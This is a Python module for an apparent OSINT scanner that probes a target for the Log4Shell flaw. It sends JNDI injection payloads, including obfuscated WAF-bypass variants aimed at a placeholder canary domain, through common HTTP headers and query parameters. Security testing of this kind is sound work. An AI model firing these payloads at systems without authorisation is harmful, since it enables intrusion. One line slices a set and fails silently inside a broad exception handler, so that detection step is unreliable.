"""Log4Shell — CVE-2021-44228 Log4j Remote Code Execution scanner.

Log4Shell is one of the most critical vulnerabilities in history.
It affects Apache Log4j 2.x and allows JNDI injection via any logged string.
CVE score: 10.0 CRITICAL.

Detection: inject JNDI payloads in all common HTTP headers and parameters.
Uses DNS-based OOB detection via canary DNS queries.
"""

from __future__ import annotations

import asyncio
import os
import re
from typing import Any
from urllib.parse import urlparse, parse_qs

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# Canary identifier for OOB detection
_CANARY_ID = os.urandom(4).hex()

# JNDI injection payloads — various bypass techniques
_JNDI_PAYLOADS: list[tuple[str, str]] = [
    # (payload_template, technique)
    ("${jndi:ldap://CANARY/a}", "classic_ldap"),
    ("${jndi:dns://CANARY/a}", "dns_lookup"),
    ("${jndi:rmi://CANARY/a}", "rmi"),
    ("${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://CANARY/a}", "lowercase_bypass"),
    ("${${::-j}${::-n}${::-d}${::-i}:ldap://CANARY/a}", "nested_bypass"),
    ("${${upper:j}ndi:ldap://CANARY/a}", "uppercase_bypass"),
    ("%24%7Bjndi:ldap://CANARY/a%7D", "url_encoded"),
    ("${j${::-n}di:ldap://CANARY/a}", "partial_nested"),
    ("${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://CANARY/a}", "env_bypass"),
    ("${${sys:java.version:-j}ndi:ldap://CANARY/a}", "sys_bypass"),
]

# Headers commonly logged by Log4j applications
_INJECTABLE_HEADERS: list[str] = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Api-Version",
    "X-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Originating-IP",
    "Referer",
    "Accept",
    "Accept-Language",
    "Accept-Encoding",
    "Authorization",
    "Cookie",
    "X-Request-ID",
    "X-Correlation-ID",
    "Contact",
    "Location",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Real-IP",
]

# Java/JVM indicators in responses (helps confirm target is Java)
_JAVA_INDICATORS = re.compile(
    r"(?i)(java|spring|tomcat|jboss|wildfly|weblogic|websphere|struts|log4j|slf4j|"
    r"javax\.|org\.apache|com\.sun|java\.lang|\.jar|\.war|\.ear)"
)


class Log4ShellScanner(BaseOsintScanner):
    """Log4Shell (CVE-2021-44228) vulnerability scanner.

    Injects JNDI payloads into all common HTTP headers and URL parameters
    that Java applications commonly log. Uses multiple bypass techniques
    to evade WAF filtering. Detects Java/JVM indicators to assess risk.

    Note: Full confirmation requires an OOB DNS callback server.
    This scanner provides indicator-based detection.
    """

    scanner_name = "log4shell"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 86400  # Cache 24h — vulnerability doesn't change frequently
    scan_timeout = 60

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        java_indicators: list[str] = []
        error_responses: list[dict[str, Any]] = []
        identifiers: list[str] = []
        payloads_sent: list[str] = []

        # Use a fake canary domain — in production replace with real OOB server
        canary_domain = f"{_CANARY_ID}.log4shell-scan.internal"

        async with httpx.AsyncClient(
            timeout=8,
            follow_redirects=True,
            verify=False,
        ) as client:

            # Step 1: Detect Java/JVM indicators in baseline response
            try:
                resp = await client.get(
                    base_url,
                    headers={"User-Agent": "Mozilla/5.0 (compatible; Log4ShellScanner/1.0)"},
                )
                body = resp.text
                for header_name, header_val in resp.headers.items():
                    if _JAVA_INDICATORS.search(header_val):
                        java_indicators.append(f"header:{header_name}:{header_val[:50]}")
                if _JAVA_INDICATORS.search(body):
                    matches = _JAVA_INDICATORS.findall(body)
                    java_indicators.extend([f"body:{m}" for m in set(matches)[:5]])

                # Check for Spring/Tomcat error pages
                if re.search(r"(?i)whitelabel error|spring boot|tomcat|glassfish|jboss", body):
                    java_indicators.append("spring_boot_or_tomcat_error_page")

                # X-Powered-By Java hints
                powered = resp.headers.get("X-Powered-By", "")
                if powered:
                    java_indicators.append(f"x_powered_by:{powered}")

            except Exception as exc:
                log.debug("Log4Shell baseline failed", url=base_url, error=str(exc))

            semaphore = asyncio.Semaphore(8)

            # Step 2: Inject JNDI payloads in headers
            async def inject_header(header_name: str, payload_tmpl: str, technique: str) -> None:
                async with semaphore:
                    payload = payload_tmpl.replace("CANARY", canary_domain)
                    payloads_sent.append(f"{header_name}: {payload[:40]}")
                    try:
                        headers = {
                            "User-Agent": "Mozilla/5.0 (compatible; Log4ShellScanner/1.0)",
                            header_name: payload,
                        }
                        resp = await client.get(base_url, headers=headers)

                        # Error 500 with Java stack trace = strong indicator
                        if resp.status_code == 500:
                            body = resp.text
                            if re.search(r"(?i)(Exception|StackTrace|NullPointer|ClassNotFound|jndi|ldap)", body):
                                error_responses.append({
                                    "header": header_name,
                                    "payload": payload[:60],
                                    "technique": technique,
                                    "status": 500,
                                    "error_snippet": re.search(
                                        r"(?i)(Exception|jndi|ldap)[^\n]{0,100}", body
                                    ).group(0)[:100] if re.search(r"(?i)(Exception|jndi|ldap)", body) else "",
                                })
                                ident = f"vuln:log4shell:error_based:{header_name}"
                                if ident not in identifiers:
                                    identifiers.append(ident)

                    except Exception:
                        pass

            # Step 3: Inject into URL parameters
            parsed = urlparse(base_url)
            existing_params = list(parse_qs(parsed.query).keys())
            test_params = existing_params + ["q", "search", "id", "user", "name", "token"]

            async def inject_param(param: str, payload_tmpl: str, technique: str) -> None:
                async with semaphore:
                    payload = payload_tmpl.replace("CANARY", canary_domain)
                    try:
                        base_clean = base_url.split("?")[0]
                        resp = await client.get(
                            f"{base_clean}?{param}={payload}",
                            headers={"User-Agent": "Mozilla/5.0"},
                        )
                        if resp.status_code == 500 and _JAVA_INDICATORS.search(resp.text):
                            error_responses.append({
                                "parameter": param,
                                "payload": payload[:60],
                                "technique": technique,
                                "status": 500,
                            })
                    except Exception:
                        pass

            tasks = []
            for header in _INJECTABLE_HEADERS[:10]:
                for payload_tmpl, technique in _JNDI_PAYLOADS[:4]:
                    tasks.append(inject_header(header, payload_tmpl, technique))

            for param in test_params[:5]:
                for payload_tmpl, technique in _JNDI_PAYLOADS[:3]:
                    tasks.append(inject_param(param, payload_tmpl, technique))

            await asyncio.gather(*tasks)

        is_java = len(java_indicators) > 0
        has_errors = len(error_responses) > 0
        risk_level = "critical" if (is_java and has_errors) else ("high" if is_java else "low")

        if is_java:
            identifiers.append("tech:java_application")
        if has_errors:
            identifiers.append("vuln:log4shell:error_indicators")

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "java_indicators": java_indicators,
            "is_java_application": is_java,
            "error_responses": error_responses,
            "payloads_sent_count": len(set(payloads_sent)),
            "canary_domain": canary_domain,
            "risk_assessment": risk_level,
            "note": "Full confirmation requires OOB DNS callback server (e.g. interactsh/burpcollaborator)",
            "cve": "CVE-2021-44228",
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
